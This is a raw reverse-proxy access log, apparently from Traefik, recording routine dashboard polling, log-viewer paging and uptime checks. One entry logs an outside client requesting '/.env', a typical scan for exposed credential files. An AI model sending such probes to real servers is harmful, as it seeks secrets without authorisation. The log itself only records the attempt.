173.48.140.140 - - [20/Dec/2023:02:44:57 +0000] "GET /api/http/routers?search=&status=&per_page=20&page=1 HTTP/1.1" 200 3111 "-" "-" 14 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:45:02 +0000] "GET /logs/ HTTP/2.0" 200 2476 "-" "-" 15 "logpager@docker" "http://172.19.0.8:80" 96ms
173.48.140.140 - - [20/Dec/2023:02:45:02 +0000] "GET /logs/styles.css?version=16 HTTP/2.0" 200 1864 "-" "-" 16 "logpager@docker" "http://172.19.0.8:80" 1ms
173.48.140.140 - - [20/Dec/2023:02:45:02 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 18 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:45:03 +0000] "GET /api/http/routers?search=&status=&per_page=20&page=1 HTTP/1.1" 200 3111 "-" "-" 19 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:45:07 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 20 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:45:08 +0000] "GET /api/http/routers?search=&status=&per_page=20&page=1 HTTP/1.1" 200 3316 "-" "-" 21 "api@internal" "-" 0ms
95.214.235.169 - - [20/Dec/2023:02:45:10 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 22 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [20/Dec/2023:02:45:10 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 23 "web-to-websecure@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:45:12 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 24 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:45:13 +0000] "GET /api/http/routers?search=&status=&per_page=20&page=1 HTTP/1.1" 200 3316 "-" "-" 25 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:45:17 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 26 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:45:18 +0000] "GET /api/http/routers?search=&status=&per_page=20&page=1 HTTP/1.1" 200 3316 "-" "-" 27 "api@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:02:45:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 28 "www@docker" "http://172.19.0.9:80" 36ms
173.48.140.140 - - [20/Dec/2023:02:45:22 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 29 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:45:23 +0000] "GET /api/http/routers?search=&status=&per_page=20&page=1 HTTP/1.1" 200 3316 "-" "-" 30 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:45:27 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 31 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:45:29 +0000] "GET /api/http/routers?search=&status=&per_page=20&page=1 HTTP/1.1" 200 3316 "-" "-" 32 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:45:32 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 33 "api@internal" "-" 0ms
167.71.120.76 - - [20/Dec/2023:02:45:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 34 "www@docker" "http://172.19.0.9:80" 23ms
173.48.140.140 - - [20/Dec/2023:02:45:34 +0000] "GET /api/http/routers?search=&status=&per_page=20&page=1 HTTP/1.1" 200 3316 "-" "-" 35 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:45:37 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 36 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:45:39 +0000] "GET /api/http/routers?search=&status=&per_page=20&page=1 HTTP/1.1" 200 3316 "-" "-" 37 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:45:42 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 38 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:45:44 +0000] "GET /api/http/routers?search=&status=&per_page=20&page=1 HTTP/1.1" 200 3316 "-" "-" 39 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:45:47 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 41 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:45:50 +0000] "GET /api/http/routers?search=&status=&per_page=20&page=1 HTTP/1.1" 200 3316 "-" "-" 42 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:45:53 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 43 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:45:55 +0000] "GET /api/http/routers?search=&status=&per_page=20&page=1 HTTP/1.1" 200 3316 "-" "-" 44 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:45:58 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 45 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:46:00 +0000] "GET /api/http/routers?search=&status=&per_page=20&page=1 HTTP/1.1" 200 3316 "-" "-" 46 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:45:02 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 504 160 "-" "-" 17 "logpager@docker" "http://172.19.0.8:80" 60013ms
173.48.140.140 - - [20/Dec/2023:02:45:47 +0000] "GET /logs/logtail.php?page=1 HTTP/2.0" 200 2459 "-" "-" 40 "logpager@docker" "http://172.19.0.8:80" 15110ms
173.48.140.140 - - [20/Dec/2023:02:46:04 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 47 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:46:05 +0000] "GET /api/http/routers?search=&status=&per_page=20&page=1 HTTP/1.1" 200 3316 "-" "-" 48 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:46:07 +0000] "GET /logs/logtail.php?page=2 HTTP/2.0" 200 2516 "-" "-" 49 "logpager@docker" "http://172.19.0.8:80" 45ms
173.48.140.140 - - [20/Dec/2023:02:46:09 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 50 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:46:10 +0000] "GET /api/http/routers?search=&status=&per_page=20&page=1 HTTP/1.1" 200 3316 "-" "-" 51 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:46:12 +0000] "GET /logs/logtail.php?page=3 HTTP/2.0" 200 2515 "-" "-" 52 "logpager@docker" "http://172.19.0.8:80" 32ms
173.48.140.140 - - [20/Dec/2023:02:46:14 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 53 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:46:16 +0000] "GET /api/http/routers?search=&status=&per_page=20&page=1 HTTP/1.1" 200 3316 "-" "-" 54 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:46:17 +0000] "GET /logs/logtail.php?page=4 HTTP/2.0" 200 2507 "-" "-" 55 "logpager@docker" "http://172.19.0.8:80" 39ms
173.48.140.140 - - [20/Dec/2023:02:46:20 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 56 "api@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:02:46:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 57 "www@docker" "http://172.19.0.9:80" 0ms
173.48.140.140 - - [20/Dec/2023:02:46:20 +0000] "GET /logs/logtail.php?page=5 HTTP/2.0" 200 2487 "-" "-" 58 "logpager@docker" "http://172.19.0.8:80" 168ms
173.48.140.140 - - [20/Dec/2023:02:46:22 +0000] "GET /api/http/routers?search=&status=&per_page=20&page=1 HTTP/1.1" 200 3316 "-" "-" 59 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:46:23 +0000] "GET /logs/logtail.php?page=6 HTTP/2.0" 200 2474 "-" "-" 60 "logpager@docker" "http://172.19.0.8:80" 56ms
173.48.140.140 - - [20/Dec/2023:02:46:25 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 61 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:46:26 +0000] "GET /logs/logtail.php?page=7 HTTP/2.0" 200 2495 "-" "-" 62 "logpager@docker" "http://172.19.0.8:80" 51ms
173.48.140.140 - - [20/Dec/2023:02:46:27 +0000] "GET /api/http/routers?search=&status=&per_page=20&page=1 HTTP/1.1" 200 3316 "-" "-" 63 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:46:30 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 64 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:46:32 +0000] "GET /api/http/routers?search=&status=&per_page=20&page=1 HTTP/1.1" 200 3316 "-" "-" 65 "api@internal" "-" 0ms
167.71.120.76 - - [20/Dec/2023:02:46:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 66 "www@docker" "http://172.19.0.9:80" 1ms
173.48.140.140 - - [20/Dec/2023:02:46:35 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 67 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:46:37 +0000] "GET /api/http/routers?search=&status=&per_page=20&page=1 HTTP/1.1" 200 3316 "-" "-" 68 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:46:38 +0000] "GET /logs/logtail.php?page=8 HTTP/2.0" 200 2503 "-" "-" 69 "logpager@docker" "http://172.19.0.8:80" 50ms
173.48.140.140 - - [20/Dec/2023:02:46:39 +0000] "GET /logs/logtail.php?page=9 HTTP/2.0" 200 2484 "-" "-" 70 "logpager@docker" "http://172.19.0.8:80" 55ms
173.48.140.140 - - [20/Dec/2023:02:46:40 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 71 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:46:41 +0000] "GET /logs/logtail.php?page=10 HTTP/2.0" 200 2547 "-" "-" 72 "logpager@docker" "http://172.19.0.8:80" 60ms
173.48.140.140 - - [20/Dec/2023:02:46:42 +0000] "GET /api/http/routers?search=&status=&per_page=20&page=1 HTTP/1.1" 200 3316 "-" "-" 74 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:46:42 +0000] "GET /logs/logtail.php?page=9 HTTP/2.0" 200 2484 "-" "-" 73 "logpager@docker" "http://172.19.0.8:80" 56ms
173.48.140.140 - - [20/Dec/2023:02:46:43 +0000] "GET /logs/logtail.php?page=8 HTTP/2.0" 200 2503 "-" "-" 75 "logpager@docker" "http://172.19.0.8:80" 69ms
173.48.140.140 - - [20/Dec/2023:02:46:45 +0000] "GET /logs/logtail.php?page=7 HTTP/2.0" 200 2495 "-" "-" 76 "logpager@docker" "http://172.19.0.8:80" 59ms
173.48.140.140 - - [20/Dec/2023:02:46:45 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 77 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:46:46 +0000] "GET /logs/logtail.php?page=6 HTTP/2.0" 200 2474 "-" "-" 78 "logpager@docker" "http://172.19.0.8:80" 52ms
173.48.140.140 - - [20/Dec/2023:02:46:47 +0000] "GET /api/http/routers?search=&status=&per_page=20&page=1 HTTP/1.1" 200 3316 "-" "-" 79 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:46:47 +0000] "GET /logs/logtail.php?page=5 HTTP/2.0" 200 2487 "-" "-" 80 "logpager@docker" "http://172.19.0.8:80" 45ms
173.48.140.140 - - [20/Dec/2023:02:46:49 +0000] "GET /logs/logtail.php?page=4 HTTP/2.0" 200 2507 "-" "-" 81 "logpager@docker" "http://172.19.0.8:80" 37ms
173.48.140.140 - - [20/Dec/2023:02:46:50 +0000] "GET /logs/logtail.php?page=3 HTTP/2.0" 200 2515 "-" "-" 82 "logpager@docker" "http://172.19.0.8:80" 33ms
173.48.140.140 - - [20/Dec/2023:02:46:50 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 83 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:46:51 +0000] "GET /logs/logtail.php?page=2 HTTP/2.0" 200 2516 "-" "-" 84 "logpager@docker" "http://172.19.0.8:80" 42ms
173.48.140.140 - - [20/Dec/2023:02:46:52 +0000] "GET /api/http/routers?search=&status=&per_page=20&page=1 HTTP/1.1" 200 3316 "-" "-" 86 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:46:52 +0000] "GET /logs/logtail.php?page=1 HTTP/2.0" 200 2459 "-" "-" 85 "logpager@docker" "http://172.19.0.8:80" 24ms
173.48.140.140 - - [20/Dec/2023:02:46:53 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2443 "-" "-" 87 "logpager@docker" "http://172.19.0.8:80" 19ms
173.48.140.140 - - [20/Dec/2023:02:46:55 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 88 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:46:56 +0000] "GET /logs/logtail.php?page=1 HTTP/2.0" 200 2459 "-" "-" 89 "logpager@docker" "http://172.19.0.8:80" 43ms
173.48.140.140 - - [20/Dec/2023:02:46:58 +0000] "GET /api/http/routers?search=&status=&per_page=20&page=1 HTTP/1.1" 200 3316 "-" "-" 90 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:46:58 +0000] "GET /logs/logtail.php?page=2 HTTP/2.0" 200 2516 "-" "-" 91 "logpager@docker" "http://172.19.0.8:80" 27ms
173.48.140.140 - - [20/Dec/2023:02:46:59 +0000] "GET /logs/logtail.php?page=3 HTTP/2.0" 200 2515 "-" "-" 92 "logpager@docker" "http://172.19.0.8:80" 31ms
173.48.140.140 - - [20/Dec/2023:02:47:00 +0000] "GET /logs/logtail.php?page=4 HTTP/2.0" 200 2507 "-" "-" 93 "logpager@docker" "http://172.19.0.8:80" 42ms
173.48.140.140 - - [20/Dec/2023:02:47:01 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 94 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:47:01 +0000] "GET /logs/logtail.php?page=5 HTTP/2.0" 200 2487 "-" "-" 95 "logpager@docker" "http://172.19.0.8:80" 36ms
173.48.140.140 - - [20/Dec/2023:02:47:02 +0000] "GET /logs/logtail.php?page=6 HTTP/2.0" 200 2474 "-" "-" 96 "logpager@docker" "http://172.19.0.8:80" 39ms
173.48.140.140 - - [20/Dec/2023:02:47:02 +0000] "GET /logs/logtail.php?page=7 HTTP/2.0" 200 2495 "-" "-" 97 "logpager@docker" "http://172.19.0.8:80" 66ms
173.48.140.140 - - [20/Dec/2023:02:47:03 +0000] "GET /api/http/routers?search=&status=&per_page=20&page=1 HTTP/1.1" 200 3316 "-" "-" 98 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:47:03 +0000] "GET /logs/logtail.php?page=8 HTTP/2.0" 200 2503 "-" "-" 99 "logpager@docker" "http://172.19.0.8:80" 50ms
173.48.140.140 - - [20/Dec/2023:02:47:04 +0000] "GET /logs/logtail.php?page=9 HTTP/2.0" 200 2484 "-" "-" 100 "logpager@docker" "http://172.19.0.8:80" 68ms
173.48.140.140 - - [20/Dec/2023:02:47:06 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 101 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:47:06 +0000] "GET /logs/logtail.php?page=10 HTTP/2.0" 200 2547 "-" "-" 102 "logpager@docker" "http://172.19.0.8:80" 87ms
173.48.140.140 - - [20/Dec/2023:02:47:07 +0000] "GET /logs/logtail.php?page=11 HTTP/2.0" 200 2511 "-" "-" 103 "logpager@docker" "http://172.19.0.8:80" 82ms
173.48.140.140 - - [20/Dec/2023:02:47:08 +0000] "GET /api/http/routers?search=&status=&per_page=20&page=1 HTTP/1.1" 200 3316 "-" "-" 104 "api@internal" "-" 1ms
173.48.140.140 - - [20/Dec/2023:02:47:08 +0000] "GET /logs/logtail.php?page=12 HTTP/2.0" 200 2491 "-" "-" 105 "logpager@docker" "http://172.19.0.8:80" 106ms
173.48.140.140 - - [20/Dec/2023:02:47:09 +0000] "GET /logs/logtail.php?page=13 HTTP/2.0" 200 2523 "-" "-" 106 "logpager@docker" "http://172.19.0.8:80" 95ms
173.48.140.140 - - [20/Dec/2023:02:47:09 +0000] "GET /logs/logtail.php?page=14 HTTP/2.0" 200 2507 "-" "-" 107 "logpager@docker" "http://172.19.0.8:80" 98ms
173.48.140.140 - - [20/Dec/2023:02:47:10 +0000] "GET /logs/logtail.php?page=15 HTTP/2.0" 200 2453 "-" "-" 108 "logpager@docker" "http://172.19.0.8:80" 104ms
173.48.140.140 - - [20/Dec/2023:02:47:11 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 109 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:47:11 +0000] "GET /logs/logtail.php?page=16 HTTP/2.0" 200 2438 "-" "-" 110 "logpager@docker" "http://172.19.0.8:80" 226ms
173.48.140.140 - - [20/Dec/2023:02:47:12 +0000] "GET /logs/logtail.php?page=17 HTTP/2.0" 200 2692 "-" "-" 111 "logpager@docker" "http://172.19.0.8:80" 137ms
173.48.140.140 - - [20/Dec/2023:02:47:13 +0000] "GET /logs/logtail.php?page=18 HTTP/2.0" 200 2883 "-" "-" 112 "logpager@docker" "http://172.19.0.8:80" 134ms
173.48.140.140 - - [20/Dec/2023:02:47:13 +0000] "GET /api/http/routers?search=&status=&per_page=20&page=1 HTTP/1.1" 200 3316 "-" "-" 113 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:47:16 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 114 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:47:16 +0000] "GET /logs/logtail.php?page=19 HTTP/2.0" 200 2366 "-" "-" 115 "logpager@docker" "http://172.19.0.8:80" 122ms
173.48.140.140 - - [20/Dec/2023:02:47:18 +0000] "GET /api/http/routers?search=&status=&per_page=20&page=1 HTTP/1.1" 200 3316 "-" "-" 116 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:47:18 +0000] "GET /logs/logtail.php?page=20 HTTP/2.0" 200 2433 "-" "-" 117 "logpager@docker" "http://172.19.0.8:80" 206ms
159.203.109.206 - - [20/Dec/2023:02:47:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 118 "www@docker" "http://172.19.0.9:80" 0ms
173.48.140.140 - - [20/Dec/2023:02:47:21 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 119 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:47:23 +0000] "GET /logs/logtail.php?page=21 HTTP/2.0" 200 2353 "-" "-" 120 "logpager@docker" "http://172.19.0.8:80" 211ms
173.48.140.140 - - [20/Dec/2023:02:47:23 +0000] "GET /api/http/routers?search=&status=&per_page=20&page=1 HTTP/1.1" 200 3316 "-" "-" 121 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:47:24 +0000] "GET /logs/logtail.php?page=22 HTTP/2.0" 200 2366 "-" "-" 122 "logpager@docker" "http://172.19.0.8:80" 169ms
173.48.140.140 - - [20/Dec/2023:02:47:26 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 123 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:47:28 +0000] "GET /api/http/routers?search=&status=&per_page=20&page=1 HTTP/1.1" 200 3316 "-" "-" 124 "api@internal" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:47:31 +0000] "GET /api/overview HTTP/1.1" 200 494 "-" "-" 125 "api@internal" "-" 0ms
167.71.120.76 - - [20/Dec/2023:02:47:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 126 "www@docker" "http://172.19.0.9:80" 0ms
173.48.140.140 - - [20/Dec/2023:02:47:43 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2443 "-" "-" 127 "logpager@docker" "http://172.19.0.8:80" 36ms
173.48.140.140 - - [20/Dec/2023:02:47:46 +0000] "GET /logs/ HTTP/2.0" 304 0 "-" "-" 128 "logpager@docker" "http://172.19.0.8:80" 1ms
173.48.140.140 - - [20/Dec/2023:02:47:46 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2443 "-" "-" 129 "logpager@docker" "http://172.19.0.8:80" 20ms
159.203.109.206 - - [20/Dec/2023:02:48:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 130 "www@docker" "http://172.19.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:02:48:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 131 "www@docker" "http://172.19.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:02:49:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 132 "www@docker" "http://172.19.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:02:49:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 133 "www@docker" "http://172.19.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:02:50:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1 "www@docker" "http://172.20.0.9:80" 96ms
20.55.53.144 - - [20/Dec/2023:02:50:21 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2 "web-to-websecure@internal" "-" 0ms
20.55.53.144 - - [20/Dec/2023:02:50:24 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3 "-" "-" 0ms
167.71.120.76 - - [20/Dec/2023:02:50:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5 "www@docker" "http://172.20.0.9:80" 59ms
173.48.140.140 - - [20/Dec/2023:02:50:26 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2785 "-" "-" 4 "logpager@docker" "http://172.20.0.3:80" 35141ms
173.48.140.140 - - [20/Dec/2023:02:50:56 +0000] "GET /logs/logtail.php?page=1 HTTP/2.0" 200 3225 "-" "-" 6 "logpager@docker" "http://172.20.0.3:80" 5051ms
173.48.140.140 - - [20/Dec/2023:02:51:06 +0000] "GET /logs/logtail.php?page=2 HTTP/2.0" 200 3244 "-" "-" 7 "logpager@docker" "http://172.20.0.3:80" 22ms
173.48.140.140 - - [20/Dec/2023:02:51:10 +0000] "GET /logs/logtail.php?page=1 HTTP/2.0" 200 3251 "-" "-" 8 "logpager@docker" "http://172.20.0.3:80" 19ms
173.48.140.140 - - [20/Dec/2023:02:51:12 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2673 "-" "-" 9 "logpager@docker" "http://172.20.0.3:80" 131ms
159.203.109.206 - - [20/Dec/2023:02:51:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10 "www@docker" "http://172.20.0.9:80" 19ms
173.48.140.140 - - [20/Dec/2023:02:51:28 +0000] "GET /logs/logtail.php?page=1 HTTP/2.0" 200 3194 "-" "-" 11 "logpager@docker" "http://172.20.0.3:80" 19ms
173.48.140.140 - - [20/Dec/2023:02:51:29 +0000] "GET /logs/logtail.php?page=2 HTTP/2.0" 200 3248 "-" "-" 12 "logpager@docker" "http://172.20.0.3:80" 21ms
45.79.181.223 - - [20/Dec/2023:02:51:30 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 13 "-" "-" 0ms
173.48.140.140 - - [20/Dec/2023:02:51:30 +0000] "GET /logs/logtail.php?page=3 HTTP/2.0" 200 3267 "-" "-" 14 "logpager@docker" "http://172.20.0.3:80" 24ms
173.48.140.140 - - [20/Dec/2023:02:51:31 +0000] "GET /logs/logtail.php?page=4 HTTP/2.0" 200 3268 "-" "-" 15 "logpager@docker" "http://172.20.0.3:80" 26ms
173.48.140.140 - - [20/Dec/2023:02:51:33 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2811 "-" "-" 16 "logpager@docker" "http://172.20.0.3:80" 19ms
167.71.120.76 - - [20/Dec/2023:02:51:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 17 "www@docker" "http://172.20.0.9:80" 19ms
173.48.140.140 - - [20/Dec/2023:02:51:36 +0000] "GET /logs/ HTTP/2.0" 304 0 "-" "-" 18 "logpager@docker" "http://172.20.0.3:80" 0ms
173.48.140.140 - - [20/Dec/2023:02:51:36 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2899 "-" "-" 19 "logpager@docker" "http://172.20.0.3:80" 18ms
173.48.140.140 - - [20/Dec/2023:02:51:54 +0000] "GET /logs/logtail.php?page=1 HTTP/2.0" 200 2785 "-" "-" 20 "logpager@docker" "http://172.20.0.3:80" 22ms
173.48.140.140 - - [20/Dec/2023:02:51:58 +0000] "GET /logs/logtail.php?page=2 HTTP/2.0" 200 3225 "-" "-" 21 "logpager@docker" "http://172.20.0.3:80" 20ms
173.48.140.140 - - [20/Dec/2023:02:51:59 +0000] "GET /logs/logtail.php?page=3 HTTP/2.0" 200 3243 "-" "-" 22 "logpager@docker" "http://172.20.0.3:80" 23ms
173.48.140.140 - - [20/Dec/2023:02:52:00 +0000] "GET /logs/logtail.php?page=4 HTTP/2.0" 200 3267 "-" "-" 23 "logpager@docker" "http://172.20.0.3:80" 40ms
173.48.140.140 - - [20/Dec/2023:02:52:00 +0000] "GET /logs/logtail.php?page=5 HTTP/2.0" 200 3241 "-" "-" 24 "logpager@docker" "http://172.20.0.3:80" 44ms
173.48.140.140 - - [20/Dec/2023:02:52:01 +0000] "GET /logs/logtail.php?page=6 HTTP/2.0" 200 3232 "-" "-" 25 "logpager@docker" "http://172.20.0.3:80" 47ms
173.48.140.140 - - [20/Dec/2023:02:52:02 +0000] "GET /logs/logtail.php?page=7 HTTP/2.0" 200 3335 "-" "-" 26 "logpager@docker" "http://172.20.0.3:80" 41ms
173.48.140.140 - - [20/Dec/2023:02:52:03 +0000] "GET /logs/logtail.php?page=8 HTTP/2.0" 200 3228 "-" "-" 27 "logpager@docker" "http://172.20.0.3:80" 50ms
173.48.140.140 - - [20/Dec/2023:02:52:03 +0000] "GET /logs/logtail.php?page=9 HTTP/2.0" 200 3365 "-" "-" 28 "logpager@docker" "http://172.20.0.3:80" 77ms
173.48.140.140 - - [20/Dec/2023:02:52:04 +0000] "GET /logs/logtail.php?page=10 HTTP/2.0" 200 3183 "-" "-" 29 "logpager@docker" "http://172.20.0.3:80" 85ms
173.48.140.140 - - [20/Dec/2023:02:52:05 +0000] "GET /logs/logtail.php?page=11 HTTP/2.0" 200 3387 "-" "-" 30 "logpager@docker" "http://172.20.0.3:80" 80ms
173.48.140.140 - - [20/Dec/2023:02:52:06 +0000] "GET /logs/logtail.php?page=12 HTTP/2.0" 200 3346 "-" "-" 31 "logpager@docker" "http://172.20.0.3:80" 89ms
173.48.140.140 - - [20/Dec/2023:02:52:06 +0000] "GET /logs/logtail.php?page=13 HTTP/2.0" 200 3376 "-" "-" 32 "logpager@docker" "http://172.20.0.3:80" 104ms
173.48.140.140 - - [20/Dec/2023:02:52:07 +0000] "GET /logs/logtail.php?page=14 HTTP/2.0" 200 3357 "-" "-" 33 "logpager@docker" "http://172.20.0.3:80" 108ms
173.48.140.140 - - [20/Dec/2023:02:52:08 +0000] "GET /logs/logtail.php?page=15 HTTP/2.0" 200 3391 "-" "-" 34 "logpager@docker" "http://172.20.0.3:80" 102ms
159.203.109.206 - - [20/Dec/2023:02:52:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 37 "www@docker" "http://172.20.0.9:80" 1ms
173.48.140.140 - - [20/Dec/2023:02:52:17 +0000] "GET /logs/logtail.php?page=16 HTTP/2.0" 200 2978 "-" "-" 35 "logpager@docker" "http://172.20.0.3:80" 6266ms
173.48.140.140 - - [20/Dec/2023:02:52:19 +0000] "GET /logs/logtail.php?page=17 HTTP/2.0" 200 2369 "-" "-" 36 "logpager@docker" "http://172.20.0.3:80" 3818ms
173.48.140.140 - - [20/Dec/2023:02:52:27 +0000] "GET /logs/logtail.php?page=18 HTTP/2.0" 200 2365 "-" "-" 38 "logpager@docker" "http://172.20.0.3:80" 164ms
173.48.140.140 - - [20/Dec/2023:02:52:28 +0000] "GET /logs/logtail.php?page=19 HTTP/2.0" 200 2723 "-" "-" 39 "logpager@docker" "http://172.20.0.3:80" 199ms
173.48.140.140 - - [20/Dec/2023:02:52:30 +0000] "GET /logs/logtail.php?page=20 HTTP/2.0" 200 2436 "-" "-" 40 "logpager@docker" "http://172.20.0.3:80" 262ms
173.48.140.140 - - [20/Dec/2023:02:52:32 +0000] "GET /logs/logtail.php?page=21 HTTP/2.0" 200 2345 "-" "-" 41 "logpager@docker" "http://172.20.0.3:80" 207ms
167.71.120.76 - - [20/Dec/2023:02:52:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 42 "www@docker" "http://172.20.0.9:80" 0ms
173.48.140.140 - - [20/Dec/2023:02:52:35 +0000] "GET /logs/logtail.php?page=22 HTTP/2.0" 200 2349 "-" "-" 43 "logpager@docker" "http://172.20.0.3:80" 162ms
173.48.140.140 - - [20/Dec/2023:02:52:37 +0000] "GET /logs/logtail.php?page=23 HTTP/2.0" 200 2345 "-" "-" 44 "logpager@docker" "http://172.20.0.3:80" 178ms
173.48.140.140 - - [20/Dec/2023:02:52:38 +0000] "GET /logs/logtail.php?page=24 HTTP/2.0" 200 2334 "-" "-" 45 "logpager@docker" "http://172.20.0.3:80" 193ms
173.48.140.140 - - [20/Dec/2023:02:52:39 +0000] "GET /logs/logtail.php?page=25 HTTP/2.0" 200 2353 "-" "-" 46 "logpager@docker" "http://172.20.0.3:80" 197ms
